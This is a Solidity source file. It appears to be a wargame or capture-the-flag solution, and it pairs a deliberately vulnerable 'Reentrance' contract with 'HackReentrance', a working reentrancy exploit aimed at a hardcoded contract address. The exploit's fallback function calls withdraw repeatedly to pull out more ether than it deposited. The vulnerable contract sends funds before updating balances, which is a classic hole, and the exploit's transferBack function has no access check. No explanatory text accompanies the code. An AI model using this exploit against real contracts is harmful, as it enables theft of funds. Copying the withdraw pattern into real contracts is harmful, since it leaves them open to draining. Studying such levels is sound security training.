pragma solidity ^0.4.18;

contract Reentrance {

  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] += msg.value;
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      if(msg.sender.call.value(_amount)()) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  function() public payable {}
}

contract HackReentrance {
    
    address toHackAddress = 0x1aa613a16d51c376d57f8ce2d971034cf8099234;
    uint iterrator;
    uint amountToWithdraw;

    function HackReentrance() payable public {
        Reentrance reentrance = Reentrance(toHackAddress);
        reentrance.donate.value(msg.value)(address(this));
        amountToWithdraw = msg.value;
        iterrator = 0;
    }
    
    function() payable public {
        if (iterrator < 2){
            Reentrance reentrance = Reentrance(toHackAddress);
            reentrance.withdraw(amountToWithdraw);
            iterrator = iterrator + 1;
        }
    }
    
    function transferBack(address _address){
        _address.transfer(address(this).balance);
    }
    
    function getBalance() view public returns (uint) {
        return address(this).balance;
    } 
    
    function hackWithdraw() {
        Reentrance reentrance = Reentrance(toHackAddress);
        reentrance.withdraw(amountToWithdraw);
    }
}